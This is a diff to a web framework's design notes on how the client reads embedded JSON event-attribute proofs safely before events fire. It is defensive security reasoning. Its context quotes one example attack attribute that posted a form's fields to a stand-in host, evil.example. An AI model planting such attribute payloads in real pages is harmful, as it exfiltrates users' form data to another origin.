@@ -98,13 +98,16 @@ which runs with no socket at all -- must find its proof. So the HTTP render arms
 collector for the page and embeds the union (`arizona_event_attrs:embed/2`, the render target's
 `static_document/2`: `<script type="application/json" id="arizona-attrs">` appended after the
 document, which the HTML parser moves into the body as its last element), exactly as
-`arizona_static` does for a static page, and `connect()` reads it (`embeddedAttrs`) before anything
-can fire -- and again on `DOMContentLoaded` when it runs while the document is still parsing, as a
-classic script before the embed does. The client takes the **last** `script[type="application/json"]`
-with that id: an id can come from user input, so an earlier element sharing it would otherwise
-win, and escaped content cannot create a script element. A page without the embed (a `?json`
-document, a page rendered another way) has no proofs until the connect frame, and runs nothing
-before it.
+`arizona_static` does for a static page -- an empty set too -- and `connect()` reads it
+(`embeddedAttrs`) before anything can fire, or, when it runs while the document is still parsing
+(the layout's inline `connect` before `</body>`), on `DOMContentLoaded` **only**: the embed comes
+after the page, so a read then could find only an element the page content holds, and proofs only
+add. The client takes the **last** `script[type="application/json"]` with that id: an id can come
+from user input, so an earlier element sharing it would otherwise win, and escaped content cannot
+create a script element (a CSP-less `?raw` injection can, which is why the server embeds even an
+empty set). It is not required to be the body's last element: a deferred or module script may
+append to the body before `DOMContentLoaded`. A page without the embed (a `?json` document, a page
+rendered another way) has no proofs until the connect frame, and runs nothing before it.
 There is **no bootstrap set**: delegating common types (`click`, `change`, ...) ahead of any proof
 used to cover that window, and it ran app data under those names as commands -- an
 `az-change='[22,"https://evil.example",{}]'` posted the form's fields to another origin.
